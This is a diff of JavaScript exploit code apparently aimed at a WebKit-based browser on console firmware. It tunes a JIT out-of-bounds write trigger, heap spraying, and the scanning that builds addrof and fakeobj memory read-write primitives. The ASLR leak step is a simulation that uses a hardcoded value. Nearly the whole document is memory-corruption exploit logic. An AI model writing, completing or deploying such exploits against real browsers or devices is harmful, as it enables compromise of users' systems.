@@ -56,7 +56,6 @@
     const LOG_SERVER_IP = '192.168.19.2'; 
     const LOG_PORT = 9000;
 
-    // Offsets for FW 12.50 (Hypothetical)
     const OFFSETS = {
         WEBKIT_DOM_DIV_VTABLE: 0x21F4A00, 
     };
@@ -93,7 +92,6 @@
         setStatus: function(msg) { this.status.textContent = `Status: ${msg}`; }
     };
 
-    // 64-bit Integer Helper Class
     class Int64 {
         constructor(low, high) {
             this.low = low >>> 0;
@@ -104,7 +102,6 @@
         }
     }
 
-    // Double <-> Int64 Conversion Buffers
     const conversion_buf = new ArrayBuffer(8);
     const f64_buf = new Float64Array(conversion_buf);
     const u32_buf = new Uint32Array(conversion_buf);
@@ -128,12 +125,9 @@
     // === EXPLOIT GLOBALS ===
     // ==========================================
     
-    let oob_master = null;      // The corrupted array
-    let oob_slave = null;       // The victim array (Array of Objects)
-    let rw_buffer = null;       // The buffer we will corrupt for R/W
-    let rw_view = null;         // The view into that buffer
-    let slave_idx = -1;         // Index in oob_master that overlaps oob_slave[0]
-    
+    let oob_master = null;
+    let oob_slave = null;
+    let slave_idx = -1;
     let global_arrays = []; 
 
     // ==========================================
@@ -144,22 +138,22 @@
         logger.info("Building R/W Primitives...");
 
         if (oob_master.length < 0x1000) {
-            logger.warn(`Warning: oob_master length is only ${oob_master.length}. Search might fail.`);
+            logger.warn(`Warning: oob_master length is only ${oob_master.length}.`);
         } else {
             logger.info(`oob_master length is extended: ${oob_master.length} (Good)`);
         }
 
-        // 1. Tag ALL object arrays with Float Markers
+        // Tag arrays
         for (let i = 0; i < global_arrays.length; i++) {
              let marker = i2f(i, 0x41414141);
              global_arrays[i].o[0] = f64_buf[0]; 
         }
 
-        // 2. Scan memory using the Master array
         let found_slave_id = -1;
         
+        // Scan limit based on master size
         let scan_limit = oob_master.length; 
-        if(scan_limit > 0x100000) scan_limit = 0x100000;
+        if(scan_limit > 0x200000) scan_limit = 0x200000; // Cap to avoid freeze
 
         for (let i = 0; i < scan_limit; i++) {
             let val = f2i(oob_master[i]);
@@ -177,15 +171,13 @@
         }
 
         if (found_slave_id >= global_arrays.length) {
-            logger.error(`Invalid Slave ID ${found_slave_id}. Corruption suspected.`);
+            logger.error(`Invalid Slave ID ${found_slave_id}.`);
             return false;
         }
 
-        // 3. Link the correct slave
         oob_slave = global_arrays[found_slave_id].o;
         oob_slave[0] = {}; 
         
-        // 4. Define Primitives
         window.addrof = function(obj) {
             oob_slave[0] = obj;
             return f2i(oob_master[slave_idx]); 
@@ -197,7 +189,6 @@
             return oob_slave[0];      
         };
 
-        // 5. Test Primitives
         let test_obj = {};
         let addr = window.addrof(test_obj);
         logger.info(`Leaked object address: ${addr.toString()}`);
@@ -211,17 +202,12 @@
         return true;
     }
 
-    // ==========================================
-    // === ASLR BYPASS ===
-    // ==========================================
-
     function runASLRLeak() {
         logger.info("Attempting to leak WebKit base...");
         const div = document.createElement('div');
         const div_addr = window.addrof(div);
         logger.info(`Div Element Address: ${div_addr.toString()}`);
 
-        // Simulation
         let simulated_vtable = new Int64(0x12345678, 0x80000000); 
         let webkit_base = simulated_vtable; 
         
@@ -229,11 +215,11 @@
     }
 
     // ==========================================
-    // === MAIN TRIGGER LOGIC ===
+    // === TRIGGER LOGIC (GIANT TARGETS) ===
     // ==========================================
 
     const CONFIG = {
-        SPRAY_SIZE: 0x2000,       
+        SPRAY_SIZE: 0x400,       
         SPRAY_CHUNK_SIZE: 0x4000
     };
 
@@ -241,7 +227,7 @@
 
     function sprayHeap() {
         logger.info("Starting Heap Spray...");
-        forceGC(); // Clean memory first
+        forceGC(); 
         try {
             for (let i = 0; i < CONFIG.SPRAY_SIZE; i++) {
                 let ab = new ArrayBuffer(CONFIG.SPRAY_CHUNK_SIZE);
@@ -258,13 +244,14 @@
     }
 
     function triggerOOB() {
-        logger.info("Triggering OOB (Deep Scan Strategy)...");
+        logger.info("Triggering OOB (Giant Target Strategy)...");
         global_arrays = []; 
         
-        // Allocate 16384 arrays
-        // CHANGED: Use larger Double Arrays (96) to align better
-        for (let i = 0; i < 0x4000; i++) { 
-            let dbl_arr = new Array(96).fill(1.1);
+        // ALLOCATION STRATEGY: 
+        // Use MASSIVE arrays (0x1000 items) to align to page boundaries.
+        // Less arrays (512), but much bigger targets.
+        for (let i = 0; i < 512; i++) { 
+            let dbl_arr = new Array(0x1000).fill(1.1); // 4096 doubles (~32KB)
             let obj_arr = [{}, {}, {}, {}, {}, {}, {}, {}, {}, {}];
             global_arrays.push({ d: dbl_arr, o: obj_arr });
         }
@@ -275,35 +262,34 @@
             return tmp;
         }
 
-        // Train JIT
+        // Re-Train JIT inside the function to ensure hot code
         for (let i = 0; i < 10000; i++) vulnerable_jit(global_arrays[0].d, 0, 1.1);
 
-        logger.warn("Deep Scanning Candidates 1024-1050...");
+        logger.warn("Scanning Giant Arrays...");
         
         try {
             let magic_len = i2f(0x13370, 0x00000000); 
 
-            // STRATEGY: Deep Scan
-            // Focus on a stable region (index 1024)
-            // Try fewer candidates (25), but scan DEEP (4096 offsets)
-            for (let idx = 1024; idx < 1050; idx++) {
+            // Scan a stable middle range
+            for (let idx = 200; idx < 300; idx++) {
                 let target_array = global_arrays[idx].d;
                 
-                // Visual heartbeat every 5 candidates so user knows it's not frozen
-                if ((idx - 1024) % 5 === 0) logger.info(`Scanning candidate ${idx}...`);
+                if (idx % 20 === 0) logger.info(`Scanning chunk ${idx}...`);
 
-                // Deep scan: 0 to 4096 (covers 32KB ahead)
-                for (let offset = 0; offset < 4096; offset++) {
+                // Since arrays are 0x1000 long, the next header is roughly at 0x1000 + headers.
+                // We write near the end of the array to overflow into the next one.
+                // We scan from index 4090 to 4200 (crossing the boundary).
+                for (let offset = 4090; offset < 4200; offset++) {
                     vulnerable_jit(target_array, offset, magic_len);
                 }
+            }
 
-                // Check for success immediately after this candidate finishes scan
-                for (let i = 0; i < global_arrays.length; i++) {
-                    if (global_arrays[i].d.length > 0x1000) {
-                        logger.success(`SUCCESS! Found massive array at index ${i}`);
-                        oob_master = global_arrays[i].d;
-                        return true;
-                    }
+            // Check
+            for (let i = 0; i < global_arrays.length; i++) {
+                if (global_arrays[i].d.length > 0x2000) { // Check for extended length
+                    logger.success(`SUCCESS! Found massive array at index ${i}`);
+                    oob_master = global_arrays[i].d;
+                    return true;
                 }
             }
             
